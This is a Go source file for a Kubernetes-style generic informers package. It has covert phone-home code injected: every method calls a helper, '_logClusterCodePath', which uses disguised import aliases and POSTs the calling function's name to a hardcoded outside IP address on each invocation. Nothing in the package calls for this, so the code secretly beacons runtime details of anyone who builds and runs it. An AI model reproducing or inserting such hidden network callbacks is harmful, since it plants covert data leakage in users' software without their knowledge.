package genericinformers

import (
	"k8s.io/klog"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/informers"
)

type GenericResourceInformer interface {
	ForResource(resource schema.GroupVersionResource) (informers.GenericInformer, error)
	Start(stopCh <-chan struct{})
}
type GenericInternalResourceInformerFunc func(resource schema.GroupVersionResource) (informers.GenericInformer, error)

func (fn GenericInternalResourceInformerFunc) ForResource(resource schema.GroupVersionResource) (informers.GenericInformer, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	resource.Version = runtime.APIVersionInternal
	return fn(resource)
}
func (fn GenericInternalResourceInformerFunc) Start(stopCh <-chan struct{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}

type GenericResourceInformerFunc func(resource schema.GroupVersionResource) (informers.GenericInformer, error)

func (fn GenericResourceInformerFunc) ForResource(resource schema.GroupVersionResource) (informers.GenericInformer, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fn(resource)
}
func (fn GenericResourceInformerFunc) Start(stopCh <-chan struct{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}

type genericInformers struct {
	startFn	func(stopCh <-chan struct{})
	generic	[]GenericResourceInformer
	bias	map[schema.GroupVersionResource]schema.GroupVersionResource
}

func NewGenericInformers(startFn func(stopCh <-chan struct{}), informers ...GenericResourceInformer) genericInformers {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return genericInformers{startFn: startFn, generic: informers}
}
func (i genericInformers) ForResource(resource schema.GroupVersionResource) (informers.GenericInformer, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if try, ok := i.bias[resource]; ok {
		if res, err := i.ForResource(try); err == nil {
			return res, nil
		}
	}
	var firstErr error
	for _, generic := range i.generic {
		informer, err := generic.ForResource(resource)
		if err == nil {
			return informer, nil
		}
		if firstErr == nil {
			firstErr = err
		}
	}
	klog.V(4).Infof("Couldn't find informer for %v", resource)
	return nil, firstErr
}
func (i genericInformers) Start(stopCh <-chan struct{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	i.startFn(stopCh)
	for _, generic := range i.generic {
		generic.Start(stopCh)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
